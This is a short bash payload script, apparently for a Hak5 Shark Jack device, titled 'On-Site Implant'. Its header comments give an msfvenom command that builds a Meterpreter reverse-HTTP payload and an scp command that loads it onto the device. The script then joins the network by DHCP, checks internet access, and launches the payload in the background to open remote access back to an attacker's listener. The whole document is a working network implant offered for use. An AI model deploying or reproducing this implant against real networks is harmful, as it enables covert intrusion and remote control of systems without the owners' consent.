#!/bin/bash
#
# Title:        On-Site Implant
#
# Description:  Uses a "Meterpreter Payload"
#               for remote access via a reverse HTTP.
#
# Author:       TW-D
# Version:      1.0
# Category:     Remote Access
#
# REQUIREMENTS
# ===============
# root@shark:~# opkg update
# root@shark:~# opkg install coreutils-timeout
# hacker@computer:~$ msfvenom --payload linux/mipsle/meterpreter_reverse_http LHOST=<LHOST> LPORT=<LPORT> --format elf --out ./meterpreter
# hacker@computer:~$ scp ./meterpreter root@172.16.24.1:/root/
#
# NOTE
# ===============
# (increase of the duration) During "LED FINISH" plug a power bank.
#
# STATUS
# ===============
# Magenta solid ................................... SETUP
# Yellow single blink ............................. ATTACK
# Green 1000ms VERYFAST blink followed by SOLID ... FINISH
#

readonly EXTERNAL_URL="http://ident.me/"
readonly METERPRETER_PAYLOAD="/root/meterpreter"

set -u

LED SETUP

NETMODE DHCP_CLIENT

dhcp=$(timeout 30 /bin/bash -c 'while ! ifconfig eth0 | grep "inet addr"; do sleep 3; done')
if [ -n "${dhcp}" ]
then

    internet=$(timeout 15 /bin/bash -c "wget ${EXTERNAL_URL} -qO /dev/null" 2>&1)
    if [ -z "${internet}" ]
    then

        LED ATTACK

        chmod +x "${METERPRETER_PAYLOAD}"
        /bin/bash -c "${METERPRETER_PAYLOAD}" &

        LED FINISH

    else
        LED FAIL2
        halt
    fi

else
    LED FAIL
    halt
fi
